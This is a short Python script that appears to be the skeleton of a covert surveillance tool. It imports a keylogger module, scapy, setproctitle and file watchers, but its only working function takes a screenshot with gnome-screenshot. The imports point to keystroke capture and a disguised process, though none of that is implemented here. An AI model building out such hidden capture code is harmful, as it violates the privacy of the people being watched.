import os, argparse, time, keylogger, subprocess, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from binascii import hexlify, unhexlify
import binascii
import setproctitle

import threading
from watchdog.observers import Observer
observer = Observer()
import watchdog
from watchdog.events import FileSystemEventHandler
from multiprocessing import Process
import crypto


def screeny():
    subprocess.call("gnome-screenshot", shell=True)

def main():
	screeny()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')